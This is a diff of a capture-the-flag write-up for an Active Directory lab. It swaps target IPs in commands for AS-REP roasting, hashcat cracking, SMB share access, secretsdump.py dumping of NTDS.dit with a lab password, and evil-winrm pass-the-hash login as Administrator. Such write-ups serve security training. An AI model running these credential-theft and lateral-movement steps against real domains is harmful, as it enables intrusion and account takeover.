@@ -146,11 +146,9 @@ $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:8a24fbdc2cc549621c14d12a525046e4$74c50723
 [-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set</pre>
 
-Discovered a hash for user account `t-skid`
+Discovered a hash for user account `t-skid`  
 
-![Alt text](<../Images/Kerberos 5,etype hashcat.png>)
-
-Hash is displayed as `Kerberos 5, etype 23, AS-REP`
+Hash is displayed as `Kerberos 5, etype 23, AS-REP`  
 
 - Crack the hash using Hashcat
 <pre>hashcat -m 18200 /home/kali/Documents/VulnNet_Roast/TGT_ticket.txt /usr/share/wordlists/rockyou.txt</pre>
@@ -159,12 +157,12 @@ We now have cracked the password for user account `t-skid`
 
 ## Enumerate + Connect to SMB using t-skid account
 - Enumerate the shares we can access
-<pre>smbmap -H 10.10.250.71 -u t-skid -p '*****'</pre>
+<pre>smbmap -H 10.10.227.72 -u t-skid -p '*****'</pre>
 
 - As the Anonymous account earlier, we couldn't access NETLOGON
 - Connect to NETLOGON share
 
-<pre>smbclient \\\\10.10.250.71\\NETLOGON -U t-skid
+<pre>smbclient \\\\10.10.227.72\\NETLOGON -U t-skid
 Password for [WORKGROUP\t-skid]:
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -183,7 +181,7 @@ strPassword = "*********"
 ## Dump NTDS.dit
 - Check if user `a-whitehat` has the privilege to dump hashes 
 
-<pre>secretsdump.py vulnnet-rst/a-whitehat:'bNdKVkjv3RR9ht'@10.10.250.71
+<pre>secretsdump.py vulnnet-rst/a-whitehat:'bNdKVkjv3RR9ht'@10.10.227.72
 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
@@ -200,4 +198,4 @@ vulnnet-rst.local\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181a
 ## Evil-WinRM
 - Ultimate shell for hacking/pentesting
 
-<pre>evil-winrm -i 10.10.250.71 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d</pre>
+<pre>evil-winrm -i 10.10.227.72 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d</pre>
